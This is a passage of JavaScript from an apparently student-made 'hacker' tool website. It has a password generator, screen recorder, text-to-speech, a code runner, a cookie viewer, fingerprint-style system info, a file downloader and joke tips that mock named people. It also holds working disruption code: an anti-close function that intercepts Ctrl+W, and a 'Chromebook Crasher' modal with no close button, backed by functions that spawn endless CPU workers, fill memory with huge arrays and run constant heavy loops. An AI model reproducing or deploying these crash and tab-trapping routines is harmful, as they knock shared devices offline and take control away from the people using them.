            const includeNumbers = document.getElementById('includeNumbers').checked;
            const includeSymbols = document.getElementById('includeSymbols').checked;

            let charset = '';
            if (includeUppercase) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            if (includeLowercase) charset += 'abcdefghijklmnopqrstuvwxyz';
            if (includeNumbers) charset += '0123456789';
            if (includeSymbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';

            if (charset === '') {
                showNotification('ERROR', 'Select at least one character type', 'error');
                return;
            }

            let password = '';
            for (let i = 0; i < length; i++) {
                password += charset.charAt(Math.floor(Math.random() * charset.length));
            }

            document.getElementById('passwordResult').textContent = password;
            navigator.clipboard.writeText(password);
            showNotification('PASSWORD GENERATED', 'Copied to clipboard', 'success');
        }

        function showToolModal(title, content, showCloseButton = true) {
            const modal = document.createElement('div');
            modal.className = 'tool-modal-backdrop';
            modal.style.position = 'fixed';
            modal.style.top = '0';
            modal.style.left = '0';
            modal.style.width = '100%';
            modal.style.height = '100%';
            modal.style.background = 'rgba(0, 0, 0, 0.9)';
            modal.style.zIndex = '6000';
            modal.style.display = 'flex';
            modal.style.alignItems = 'center';
            modal.style.justifyContent = 'center';

            // Only close modal when clicking backdrop if close button is shown
            if (showCloseButton) {
                modal.onclick = function(e) {
                    if (e.target === modal) {
                        modal.remove();
                    }
                };
            }

            const closeButtonHTML = showCloseButton ? `
                <div style="text-align: center; margin-top: 20px;">
                    <button onclick="this.closest('.tool-modal-backdrop').remove()" style="background: var(--hacker-red); color: #fff; border: none; padding: 8px 20px; border-radius: 5px; cursor: pointer;">CLOSE</button>
                </div>` : '';

            modal.innerHTML = `
                <div class="tool-modal-content" style="background: #000; border: 3px solid var(--hacker-cyan); border-radius: 20px; padding: 30px; max-width: 600px; width: 90%; max-height: 85vh; overflow-y: auto; box-shadow: 0 0 50px rgba(0, 255, 255, 0.5);"
                     onclick="event.stopPropagation()">
                    <div style="color: var(--hacker-cyan); font-size: 24px; font-weight: bold; margin-bottom: 25px; text-align: center; text-shadow: 0 0 15px var(--hacker-cyan); background: linear-gradient(45deg, var(--hacker-cyan), var(--hacker-green)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">${title}</div>
                    ${content}
                    ${closeButtonHTML}
                </div>
            `;

            document.body.appendChild(modal);
        }

        // Tools Page Functionality
        function initializeToolsPage() {
            // Tools cards are already set up with onclick handlers in HTML
            updateDevToolsVisibility();
            initializeDevTools();
        }

        function showNotification(title, message, type = 'info') {
            const notification = document.createElement('div');
            notification.style.position = 'fixed';
            notification.style.top = '20px';
            notification.style.right = '20px';
            notification.style.background = 'rgba(0, 0, 0, 0.9)';
            notification.style.borderRadius = '10px';
            notification.style.padding = '15px';
            notification.style.fontFamily = 'monospace';
            notification.style.fontSize = '14px';
            notification.style.zIndex = '1000';
            notification.style.border = '2px solid';
            notification.style.maxWidth = '300px';

            let color, icon;
            switch (type) {
                case 'success':
                    color = 'var(--hacker-green)';
                    icon = '';
                    break;
                case 'error':
                    color = 'var(--hacker-red)';
                    icon = '';
                    break;
                case 'warning':
                    color = 'var(--hacker-orange)';
                    icon = '';
                    break;
                default:
                    color = 'var(--hacker-cyan)';
                    icon = '';
            }

            notification.style.borderColor = color;
            notification.style.color = color;

            notification.innerHTML = `
                <div style="font-weight: bold; margin-bottom: 5px; color: var(--hacker-cyan);">${icon} ${title}</div>
                <div>${message}</div>
            `;

            document.body.appendChild(notification);

            setTimeout(() => {
                notification.style.opacity = '0';
                setTimeout(() => notification.remove(), 500);
            }, 3000);
        }

        // Threat Image Functionality (Random Threat Injection)
        class ThreatInjector {
            constructor() {
                this.threatImages = [
                    'https://nashuproar.org/wp-content/uploads/2022/03/securely.png',
                    'https://support.securly.com/hc/article_attachments/4414035508503'
                ];
                this.overlay = document.getElementById('threatOverlay');
                this.imageElement = document.getElementById('threatImage');
                this.slicesContainer = document.getElementById('threatSlices');

                // Start random threat injection
                this.startRandomInjection();
            }

            startRandomInjection() {
                // Schedule first threat injection randomly between 30-120 seconds
                const initialDelay = (Math.random() * 90 + 30) * 1000;

                setTimeout(() => {
                    this.injectThreat();
                }, initialDelay);
            }

            injectThreat() {
                // Pick random threat image
                const threatUrl = this.threatImages[Math.floor(Math.random() * this.threatImages.length)];

                // Show overlay and set image
                this.overlay.classList.add('active');
                this.imageElement.style.backgroundImage = `url('${threatUrl}')`;

                // Trigger flash effect on body
                document.body.classList.add('threat-flash');

                // After 2 seconds, start slicing animation
                setTimeout(() => {
                    this.createSlices(threatUrl);
                }, 2000);
            }

            createSlices(imageUrl) {
                // Hide original image
                this.imageElement.style.opacity = '0';

                // Create 10 slices
                this.slicesContainer.innerHTML = '';

                for (let i = 1; i <= 10; i++) {
                    const slice = document.createElement('div');
                    slice.className = 'slice';
                    slice.style.backgroundImage = `url('${imageUrl}')`;

                    // Position slice backgrounds to create horizontal slices
                    const sliceHeight = 100 / 10; // 10% each slice
                    slice.style.backgroundPosition = `center ${(i - 1) * sliceHeight}%`;
                    slice.style.backgroundSize = 'contain';

                    this.slicesContainer.appendChild(slice);
                }

                // After 2.5 seconds (slice animations complete), hide overlay
                setTimeout(() => {
                    this.overlay.classList.remove('active');
                    document.body.classList.remove('threat-flash');

                    // Reset for next threat
                    this.imageElement.style.opacity = '1';
                    this.slicesContainer.innerHTML = '';

                    // Schedule next threat randomly between 60-180 seconds
                    const nextDelay = (Math.random() * 120 + 60) * 1000;
                    setTimeout(() => {
                        this.injectThreat();
                    }, nextDelay);
                }, 2500);
            }
        }

        // Tips Cycling System
        class TipsCycler {
            constructor() {
                this.tips = [
                    "the c diddy meme is not massive",
                    "low taper fade is NOT massive",
                    "dj khaled is banned from this site",
                    "parking lot",
                    "lock in...",
                    "tribute to tuff games...",
                    "parbon is hello",
                    "taco bell",
                    "dj khaled is sooooooooooooooooooooooooo annoying",
                    "parker is a parking lot",
                    "maddy is a 6'7 leprechaun",
                    "evie and liesl are boyfriends",
                    "dezzie is twin",
                    "bumming is a lifestyle",
                    "maddie is 67"
                ];
                this.currentIndex = 0;
                this.tipsElement = document.getElementById('tipsText');
                this.isAnimating = false;
                this.startCycling();
            }

            startCycling() {
                this.showTip();
                setInterval(() => {
                    this.cycleTip();
                }, 8000); // 8 second intervals
            }

            showTip() {
                this.tipsElement.textContent = `"${this.tips[this.currentIndex]}"`;
                this.tipsElement.style.transform = 'translateY(0)';
                this.tipsElement.style.opacity = '1';
            }

            cycleTip() {
                if (this.isAnimating) return;

                this.isAnimating = true;

                // Smooth slide up and fade out
                this.tipsElement.style.transition = 'all 0.5s cubic-bezier(0.4, 0, 0.2, 1)';
                this.tipsElement.style.transform = 'translateY(-10px)';
                this.tipsElement.style.opacity = '0';

                setTimeout(() => {
                    this.currentIndex = (this.currentIndex + 1) % this.tips.length;
                    this.showTip();

                    // Add a subtle entrance animation
                    this.tipsElement.style.transform = 'translateY(10px)';
                    this.tipsElement.style.opacity = '0';

                    setTimeout(() => {
                        this.tipsElement.style.transition = 'all 0.6s cubic-bezier(0.4, 0, 0.2, 1)';
                        this.tipsElement.style.transform = 'translateY(0)';
                        this.tipsElement.style.opacity = '1';

                        setTimeout(() => {
                            this.isAnimating = false;
                            this.tipsElement.style.transition = '';
                        }, 600);
                    }, 50);
                }, 500);
            }
        }

        // Enhanced Tool: Screen Capture Tool
        function showScreenCapture() {
            if (!devModeActive) {
                if (!checkDevCode()) return;
            }

            showToolModal(' SCREEN CAPTURE', `
                <div style="text-align: center;">
                    <div style="margin: 20px 0;">
                        <button onclick="captureScreenshot()" style="background: var(--hacker-green); color: #000; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;">CAPTURE SCREENSHOT</button>
                    </div>
                    <div style="margin: 20px 0;">
                        <button onclick="startScreenRecording()" id="recordBtn" style="background: var(--hacker-red); color: #fff; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;">START RECORDING</button>
                    </div>
                    <div id="captureStatus" style="margin-top: 20px; padding: 10px; background: rgba(0,0,0,0.6); border: 1px solid var(--hacker-orange); font-family: monospace;"></div>
                </div>
            `);

            // Set up recording button
            setTimeout(() => {
                const recordBtn = document.getElementById('recordBtn');
                if (recordBtn) {
                    recordBtn.onclick = function() {
                        if (this.textContent === 'START RECORDING') {
                            startScreenRecording();
                            this.textContent = 'STOP RECORDING';
                            this.style.background = 'var(--hacker-orange)';
                        } else {
                            stopScreenRecording();
                            this.textContent = 'START RECORDING';
                            this.style.background = 'var(--hacker-red)';
                        }
                    };
                }
            }, 100);
        }

        function captureScreenshot() {
            const statusDiv = document.getElementById('captureStatus');
            statusDiv.textContent = 'Capturing screenshot...';

            html2canvas(document.body).then(canvas => {
                const link = document.createElement('a');
                link.download = `wave-x-capture-${Date.now()}.png`;
                link.href = canvas.toDataURL();
                link.click();
                statusDiv.textContent = 'Screenshot saved!';
                showNotification('SCREENSHOT SAVED', 'Image downloaded successfully', 'success');
            }).catch(err => {
                statusDiv.textContent = 'Screenshot failed: ' + err.message;
                showNotification('SCREENSHOT FAILED', 'Unable to capture screen', 'error');
            });
        }

        let mediaRecorder = null;
        let recordedChunks = [];

        function startScreenRecording() {
            const statusDiv = document.getElementById('captureStatus');
            statusDiv.textContent = 'Recording screen... (Press STOP to finish)';

            navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
                .then(stream => {
                    mediaRecorder = new MediaRecorder(stream);
                    recordedChunks = [];

                    mediaRecorder.ondataavailable = event => {
                        if (event.data.size > 0) {
                            recordedChunks.push(event.data);
                        }
                    };

                    mediaRecorder.onstop = () => {
                        const blob = new Blob(recordedChunks, { type: 'video/webm' });
                        const url = URL.createObjectURL(blob);
                        const link = document.createElement('a');
                        link.href = url;
                        link.download = `wave-x-recording-${Date.now()}.webm`;
                        link.click();
                        statusDiv.textContent = 'Screen recording saved!';
                        showNotification('RECORDING SAVED', 'Video downloaded successfully', 'success');
                        stream.getTracks().forEach(track => track.stop());
                    };

                    mediaRecorder.start();
                })
                .catch(err => {
                    statusDiv.textContent = 'Recording failed: ' + err.message;
                    showNotification('RECORDING FAILED', 'Unable to start recording', 'error');
                });
        }

        function stopScreenRecording() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }

        // Enhanced Tool: Text-to-Speech
        function showTextToSpeech() {
            if (!devModeActive) {
                if (!checkDevCode()) return;
            }

            showToolModal(' TEXT-TO-SPEECH', `
                <div style="text-align: center;">
                    <textarea id="ttsInput" placeholder="Enter text to speak..." style="width: 100%; height: 100px; margin: 10px 0; background: rgba(0,0,0,0.8); border: 2px solid var(--hacker-cyan); color: var(--hacker-green); font-family: monospace; resize: vertical;"></textarea>
                    <div style="margin: 15px 0;">
                        <label style="color: var(--hacker-cyan); margin-right: 10px;">Voice:</label>
                        <select id="ttsVoice" style="background: rgba(0,0,0,0.8); border: 2px solid var(--hacker-cyan); color: var(--hacker-green); font-family: monospace; padding: 5px;"></select>
                    </div>
                    <div style="margin: 15px 0;">
                        <label style="color: var(--hacker-cyan); margin-right: 10px;">Speed:</label>
                        <input type="range" id="ttsRate" min="0.1" max="2" step="0.1" value="1" style="width: 120px;">
                        <span id="rateValue" style="color: var(--hacker-orange); margin-left: 10px;">1.0x</span>
                    </div>
                    <div style="margin: 15px 0;">
                        <label style="color: var(--hacker-cyan); margin-right: 10px;">Pitch:</label>
                        <input type="range" id="ttsPitch" min="0" max="2" step="0.1" value="1" style="width: 120px;">
                        <span id="pitchValue" style="color: var(--hacker-orange); margin-left: 10px;">1.0</span>
                    </div>
                    <button onclick="speakText()" style="background: var(--hacker-green); color: #000; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; margin: 10px;">SPEAK TEXT</button>
                    <button onclick="stopSpeech()" style="background: var(--hacker-red); color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 10px;">STOP</button>
                </div>
            `);

            // Populate voices
            setTimeout(() => {
                populateVoices();
                document.getElementById('ttsRate').oninput = updateRateValue;
                document.getElementById('ttsPitch').oninput = updatePitchValue;
            }, 100);
        }

        function populateVoices() {
            const voiceSelect = document.getElementById('ttsVoice');
            const voices = speechSynthesis.getVoices();

            voices.forEach(voice => {
                const option = document.createElement('option');
                option.value = voice.name;
                option.textContent = `${voice.name} (${voice.lang})`;
                voiceSelect.appendChild(option);
            });
        }

        function updateRateValue() {
            document.getElementById('rateValue').textContent = this.value + 'x';
        }

        function updatePitchValue() {
            document.getElementById('pitchValue').textContent = this.value;
        }

        function speakText() {
            const text = document.getElementById('ttsInput').value;
            const voiceName = document.getElementById('ttsVoice').value;
            const rate = parseFloat(document.getElementById('ttsRate').value);
            const pitch = parseFloat(document.getElementById('ttsPitch').value);

            if (!text.trim()) {
                showNotification('ERROR', 'Please enter text to speak', 'error');
                return;
            }

            const utterance = new SpeechSynthesisUtterance(text);
            const voices = speechSynthesis.getVoices();
            const selectedVoice = voices.find(voice => voice.name === voiceName);

            if (selectedVoice) utterance.voice = selectedVoice;
            utterance.rate = rate;
            utterance.pitch = pitch;

            speechSynthesis.speak(utterance);
            showNotification('SPEAKING', 'Text-to-speech started', 'success');
        }

        function stopSpeech() {
            speechSynthesis.cancel();
            showNotification('STOPPED', 'Speech cancelled', 'info');
        }

        // Enhanced Tool: Code Editor
        function showCodeEditor() {
            if (!devModeActive) {
                if (!checkDevCode()) return;
            }

            showToolModal(' CODE EDITOR', `
                <div style="text-align: center;">
                    <div style="margin: 10px 0; font-size: 12px; color: var(--hacker-cyan);">
                        Simple code editor with syntax highlighting (JavaScript/HTML/CSS)
                    </div>
                    <select id="languageSelect" style="background: rgba(0,0,0,0.8); border: 2px solid var(--hacker-cyan); color: var(--hacker-green); font-family: monospace; padding: 5px; margin: 10px 0;">
                        <option value="javascript">JavaScript</option>
                        <option value="html">HTML</option>
                        <option value="css">CSS</option>
                    </select>
                    <textarea id="codeInput" placeholder="Enter your code here..." style="width: 100%; height: 300px; margin: 10px 0; background: rgba(0,0,0,0.9); border: 2px solid var(--hacker-cyan); color: var(--hacker-green); font-family: 'Courier New', monospace; resize: vertical; font-size: 14px; line-height: 1.4;"></textarea>
                    <div style="display: flex; gap: 10px; justify-content: center; margin: 15px 0;">
                        <button onclick="runCode()" style="background: var(--hacker-green); color: #000; border: none; padding: 12px 25px; border-radius: 6px; cursor: pointer; font-weight: bold;">RUN CODE</button>
                        <button onclick="clearCode()" style="background: var(--hacker-orange); color: #000; border: none; padding: 12px 25px; border-radius: 6px; cursor: pointer; font-weight: bold;">CLEAR</button>
                        <button onclick="saveCode()" style="background: var(--hacker-cyan); color: #000; border: none; padding: 12px 25px; border-radius: 6px; cursor: pointer; font-weight: bold;">SAVE</button>
                    </div>
                    <div id="codeOutput" style="margin-top: 15px; padding: 15px; background: rgba(0,0,0,0.8); border: 1px solid var(--hacker-orange); font-family: monospace; font-size: 12px; text-align: left; max-height: 200px; overflow-y: auto; white-space: pre-wrap;"></div>
                </div>
            `);
        }

        function runCode() {
            const code = document.getElementById('codeInput').value;
            const language = document.getElementById('languageSelect').value;
            const outputDiv = document.getElementById('codeOutput');

            outputDiv.textContent = 'Running code...\n';

            try {
                if (language === 'javascript') {
                    // Capture console.log
                    let originalLog = console.log;
                    let logs = [];
                    console.log = (...args) => {
                        logs.push(args.join(' '));
                    };

                    // Run the code in a new function scope
                    let result = new Function(code)();
                    console.log = originalLog;

                    outputDiv.textContent = (logs.length > 0 ? logs.join('\n') + '\n' : '') +
                                          (result !== undefined ? 'Return: ' + result : 'Code executed successfully');
                } else {
                    outputDiv.textContent = `Language "${language}" support coming soon!\n\nPreview:\n${code}`;
                }

                showNotification('CODE RUN', 'Successfully executed', 'success');
            } catch (error) {
                outputDiv.textContent = `Error: ${error.message}\n\n${error.stack}`;
                showNotification('CODE ERROR', 'Execution failed', 'error');
            }
        }

        function clearCode() {
            document.getElementById('codeInput').value = '';
            document.getElementById('codeOutput').textContent = '';
            showNotification('CLEARED', 'Code editor cleared', 'info');
        }

        function saveCode() {
            const code = document.getElementById('codeInput').value;
            const blob = new Blob([code], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const link = document.createElement('a');
            link.href = url;
            link.download = `wave-x-code-${Date.now()}.txt`;
            link.click();
            URL.revokeObjectURL(url);
            showNotification('SAVED', 'Code file downloaded', 'success');
        }

        // Enhanced Anti-Close Tab with more features
        function antiCloseTab() {
            // Prevent browser tab from closing
            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = 'WARNING: Anti-close tab is active. Are you sure you want to leave?';
                return 'WARNING: Anti-close tab is active. Are you sure you want to leave?';
            });

            // Override close attempts
            document.onkeydown = function(e) {
                if ((e.ctrlKey || e.metaKey) && (e.key === 'w' || e.key === 'W')) {
                    e.preventDefault();
                    showNotification('ANTI-CLOSE ACTIVE', 'Tab close prevented - hold Shift+Ctrl+W to force close', 'warning');
                    return false;
                }
            };

            showNotification('ANTI CLOSE TAB', 'Enhanced tab protection enabled', 'success');
        }

        // Enhanced Chromebook Crasher with more options
        function chromebookCrasher() {
            showToolModal(' CHROMEBOOK CRASHER', `
                <div style="text-align: center;">
                    <div style="margin: 20px 0; color: var(--hacker-red); font-weight: bold; font-size: 18px;">
                         HIGH RISK SYSTEM CRASHER 
                    </div>
                    <div style="margin: 20px 0; color: var(--hacker-cyan); border: 2px solid var(--hacker-cyan); border-radius: 10px; padding: 15px; background: rgba(0,0,0,0.7);">
                        <div style="font-size: 14px; margin-bottom: 8px;">WHITE OUT VIRUS - CHROMEBOOK MANAGEMENT SUITE</div>
                        <div style="font-size: 12px; opacity: 0.8;">Click any button below to initiate crash sequence</div>
                    </div>
                    <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin: 20px 0;">
                        <button onclick="chromebookCrasher()" style="background: linear-gradient(135deg, var(--hacker-red), var(--hacker-orange)); color: #fff; border: 2px solid var(--hacker-red); padding: 25px 20px; border-radius: 15px; cursor: pointer; font-weight: bold; font-size: 20px; text-transform: uppercase; transition: all 0.3s; box-shadow: 0 0 25px rgba(255, 0, 0, 0.6);" onmouseover="this.style.boxShadow='0 0 40px rgba(255, 0, 0, 0.9), inset 0 0 20px rgba(255, 0, 0, 0.3)'" onmouseout="this.style.boxShadow='0 0 25px rgba(255, 0, 0, 0.6)'"> CHROMEBOOK CRASHER </button>
                    </div>
                    <div id="crashStatus" style="margin-top: 20px; padding: 15px; background: rgba(0,0,0,0.8); border: 2px solid var(--hacker-orange); border-radius: 8px; font-family: monospace; font-size: 13px; color: var(--hacker-cyan);"></div>
                </div>
            `, false);  // false = no close button
        }

        let crashWorkers = [];
        let crashInterval = null;

        function basicCrash() {
            // Original method
            for (let i = 0; i < navigator.hardwareConcurrency || 4; i++) {
                let worker = new Worker('data:application/javascript,' + encodeURIComponent(`
                    while (true) {
                        let sum = 0;
                        for (let j = 0; j < 1e8; j++) sum += Math.sin(j);
                    }
                `));
                crashWorkers.push(worker);
            }
            updateCrashStatus('Basic crash initiated - High CPU loads created');
            document.body.style.animation = 'shudder 0.1s infinite';
        }

        function memoryBomb() {
            // Memory bomb - create massive arrays
            setTimeout(() => {
                for (let i = 0; i < 1000; i++) {
                    let hugeArray = new Array(1000000).fill(Math.random());
                    crashWorkers.push({ array: hugeArray }); // Keep reference to prevent GC
                }
            }, 1000);

            updateCrashStatus('Memory bomb deployed - RAM will fill rapidly');
            document.body.style.animation = 'shudder 0.05s infinite';
        }

        function cpuOverload() {
            crashInterval = setInterval(() => {
                // Create many heavy calculations
                for (let i = 0; i < 100; i++) {
                    setTimeout(() => {
                        let result = 0;
                        for (let j = 0; j < 10000000; j++) result += Math.sin(j);
                    }, Math.random() * 100);
                }
            }, 100);

            updateCrashStatus('CPU overload started - Continuous calculations running');
        }

        function stopCrash() {
            // Stop all workers
            crashWorkers.forEach(worker => {
                if (worker.terminate) worker.terminate();
            });
            crashWorkers = [];

            // Stop intervals
            if (crashInterval) {
                clearInterval(crashInterval);
                crashInterval = null;
            }

            // Stop animations
            document.body.style.animation = '';

            updateCrashStatus('All crash functions stopped - System stabilizing');
            showNotification('STOPPED', 'Crash functions terminated', 'success');
        }

        function updateCrashStatus(message) {
            const statusDiv = document.getElementById('crashStatus');
            if (statusDiv) {
                statusDiv.textContent = message;
            }
        }

        // Additional Tool Functions
        function showCookieManager() {
            if (!devModeActive) {
                if (!checkDevCode()) return;
            }

            const cookies = document.cookie.split(';').filter(c => c.trim());
            let cookieHTML = '<div style="text-align: center; margin: 20px 0;"><h3 style="color: var(--hacker-cyan); margin-bottom: 15px;">BROWSER COOKIES</h3>';

            if (cookies.length === 0) {
                cookieHTML += '<div style="color: var(--hacker-orange); margin: 20px 0;">No cookies found</div>';
            } else {
                cookies.forEach(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    cookieHTML += `
                        <div style="margin: 15px 0; padding: 15px; background: rgba(0,0,0,0.6); border: 1px solid var(--hacker-green); border-radius: 8px;">
                            <div style="color: var(--hacker-cyan); font-weight: bold; margin-bottom: 5px;">${name || 'Unnamed'}</div>
                            <div style="color: var(--hacker-green); font-family: monospace; word-break: break-all; margin-bottom: 10px;">${value || 'No value'}</div>
                            <button onclick="deleteCookie('${name}')" style="background: var(--hacker-red); color: #fff; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer;">DELETE</button>
                            <button onclick="navigator.clipboard.writeText('${cookie.trim()}')" style="background: var(--hacker-cyan); color: #000; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; margin-left: 10px;">COPY</button>
                        </div>
                    `;
                });
            }

            cookieHTML += `
                <div style="margin: 20px; display: flex; justify-content: center; gap: 10px;">
                    <button onclick="document.cookie.split(';').forEach(c => { const name = c.split('=')[0].trim(); document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT'; }); showCookieManager()" style="background: var(--hacker-red); color: #fff; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold;">DELETE ALL COOKIES</button>
                    <button onclick="document.cookie = 'test_cookie=test_value; max-age=3600'; showCookieManager()" style="background: var(--hacker-green); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold;">ADD TEST COOKIE</button>
                </div>
            `;

            showToolModal(' COOKIE MANAGER', cookieHTML);
        }

        function deleteCookie(name) {
            document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT';
            showCookieManager();
            showNotification('COOKIE DELETED', `Removed cookie: ${name}`, 'success');
        }

        function showSystemInfo() {
            if (!devModeActive) {
                if (!checkDevCode()) return;
            }

            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;

            const sysInfo = {
                'User Agent': navigator.userAgent,
                'Platform': navigator.platform,
                'Language': navigator.language,
                'Languages': navigator.languages ? navigator.languages.join(', ') : 'N/A',
                'Cookie Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
                'On Line': navigator.onLine ? 'Yes' : 'No',
                'Screen Resolution': `${screen.width}x${screen.height}`,
                'Window Size': `${window.innerWidth}x${window.innerHeight}`,
                'Color Depth': `${screen.colorDepth}-bit`,
                'Pixel Ratio': window.devicePixelRatio || 1,
                'CPU Cores': navigator.hardwareConcurrency || 'Unknown',
                'Memory': navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
                'Battery': navigator.getBattery ? 'Supported' : 'Not supported',
                'Geolocation': navigator.geolocation ? 'Available' : 'Blocked',
                'WebGL Vendor': debInfo ? gl.getParameter(debInfo.UNMASKED_VENDOR_WEBGL) : 'Not available',
                'WebGL Renderer': debInfo ? gl.getParameter(debInfo.UNMASKED_RENDERER_WEBGL) : 'Not available',
                'Local Storage': 'localStorage' in window ? 'Available' : 'Blocked',
                'Session Storage': 'sessionStorage' in window ? 'Available' : 'Blocked',
                'IndexedDB': 'indexedDB' in window ? 'Available' : 'Not supported',
                'Web Workers': 'Worker' in window ? 'Supported' : 'Not supported',
                'Service Workers': 'serviceWorker' in navigator ? 'Supported' : 'Not supported',
                'Touch Events': 'ontouchstart' in window ? 'Supported' : 'Not supported',
                'Orientation': typeof DeviceOrientationEvent !== 'undefined' ? 'Supported' : 'Not supported'
            };

            let infoHTML = '<div style="text-align: center;"><h3 style="color: var(--hacker-cyan); margin-bottom: 20px;">SYSTEM INFORMATION</h3>';
            infoHTML += '<div style="max-height: 400px; overflow-y: auto; margin: 0 auto; max-width: 600px;">';

            Object.entries(sysInfo).forEach(([key, value]) => {
                infoHTML += `
                    <div style="display: flex; justify-content: space-between; align-items: center; padding: 8px; margin: 4px 0; background: rgba(0,0,0,0.6); border: 1px solid var(--hacker-green); border-radius: 4px;">
                        <span style="color: var(--hacker-cyan); font-weight: bold;">${key}:</span>
                        <span id="${key.replace(/\s+/g, '_').replace(/[^a-zA-Z0-9_]/g, '')}" style="color: var(--hacker-green); font-family: monospace; text-align: right; max-width: 300px; overflow: hidden; text-overflow: ellipsis;" title="${value}">${value}</span>
                    </div>
                `;
            });

            infoHTML += `
                </div>
                <div style="margin: 20px; display: flex; justify-content: center; gap: 10px;">
                    <button onclick="refreshSystemInfo()" style="background: var(--hacker-cyan); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold;">REFRESH</button>
                    <button onclick="exportSystemInfo()" style="background: var(--hacker-green); color: #000; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold;">EXPORT</button>
                </div>
            `;

            showToolModal(' SYSTEM INFO', infoHTML);
        }

        function refreshSystemInfo() {
            showSystemInfo();
            showNotification('REFRESHED', 'System information updated', 'info');
        }

        function exportSystemInfo() {
            // Gather current system info
            const sysData = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                window: `${window.innerWidth}x${window.innerHeight}`,
                cores: navigator.hardwareConcurrency,
                language: navigator.language,
                online: navigator.onLine,
                cookieEnabled: navigator.cookieEnabled
            };

            const jsonStr = JSON.stringify(sysData, null, 2);
            const blob = new Blob([jsonStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const link = document.createElement('a');
            link.href = url;
            link.download = `wave-x-sysinfo-${Date.now()}.json`;
            link.click();
            URL.revokeObjectURL(url);
            showNotification('EXPORTED', 'System info saved as JSON', 'success');
        }

        function showFileDownloader() {
            if (!devModeActive) {
                if (!checkDevCode()) return;
            }

            showToolModal(' FILE DOWNLOADER', `
                <div style="text-align: center;">
                    <div style="margin: 15px 0; color: var(--hacker-green); font-size: 14px;">
                        Download any file from a URL
                    </div>
                    <input type="url" id="fileUrl" placeholder="https://example.com/file.zip" style="width: 100%; margin: 15px 0; padding: 15px; background: rgba(0,0,0,0.8); border: 2px solid var(--hacker-cyan); color: var(--hacker-green); font-family: monospace; border-radius: 8px; box-sizing: border-box;">
                    <div style="display: flex; justify-content: center; gap: 10px; margin: 20px 0;">
                        <button onclick="downloadFile()" style="background: var(--hacker-green); color: #000; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;">DOWNLOAD</button>
                        <button onclick="downloadImage()" style="background: var(--hacker-cyan); color: #000; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-weight: bold;">DOWNLOAD IMAGE</button>
                    </div>
                    <div id="downloadStatus" style="margin-top: 20px; padding: 15px; background: rgba(0,0,0,0.6); border: 1px solid var(--hacker-orange); border-radius: 8px; font-family: monospace; text-align: left;"></div>

                    <div style="margin-top: 30px; text-align: left; color: var(--hacker-green);">
                        <h4 style="color: var(--hacker-cyan); margin-bottom: 10px;">Recent Downloads:</h4>
                        <div id="downloadHistory" style="max-height: 150px; overflow-y: auto; background: rgba(0,0,0,0.4); padding: 10px; border-radius: 4px;">
                            No downloads yet
                        </div>
                    </div>
                </div>
            `);
        }

        function downloadFile() {
            const url = document.getElementById('fileUrl').value.trim();
            const statusDiv = document.getElementById('downloadStatus');

            if (!url) {
                statusDiv.textContent = ' Please enter a valid URL';
                showNotification('ERROR', 'URL is required', 'error');
                return;
            }

            statusDiv.textContent = ' Starting download...\nURL: ' + url;

            try {
                const link = document.createElement('a');
                link.href = url;
                link.download = url.split('/').pop() || `download-${Date.now()}`;
                link.target = '_blank';

                // Add to download history
                const historyDiv = document.getElementById('downloadHistory');
                const historyEntry = document.createElement('div');
                historyEntry.style.margin = '5px 0';
                historyEntry.style.padding = '5px';
                historyEntry.style.background = 'rgba(0,0,0,0.3)';
                historyEntry.style.borderRadius = '3px';
                historyEntry.innerHTML = `
                    <div style="color: var(--hacker-green); font-size: 12px;">${new Date().toLocaleTimeString()}</div>
                    <div style="color: var(--hacker-cyan); font-size: 11px;">${url.split('/').pop()}</div>
                `;

                if (historyDiv.textContent === 'No downloads yet') {
                    historyDiv.innerHTML = '';
                }
                historyDiv.appendChild(historyEntry);

                link.click();
                statusDiv.textContent = ' Download initiated!\nFile: ' + link.download;
                showNotification('DOWNLOADING', 'File download started', 'success');

            } catch (error) {
                statusDiv.textContent = ' Download failed: ' + error.message;
                showNotification('DOWNLOAD FAILED', error.message, 'error');
            }
        }

        function downloadImage() {
            const url = document.getElementById('fileUrl').value.trim();
            const statusDiv = document.getElementById('downloadStatus');

            if (!url) {
                statusDiv.textContent = ' Please enter an image URL';
                showNotification('ERROR', 'Image URL is required', 'error');
                return;
            }

            statusDiv.textContent = ' Loading image...\nURL: ' + url;

            fetch(url, { mode: 'cors' })
                .then(response => {
                    if (!response.ok) throw new Error('Failed to load image');
                    return response.blob();
                })
                .then(blob => {
                    const objectUrl = URL.createObjectURL(blob);
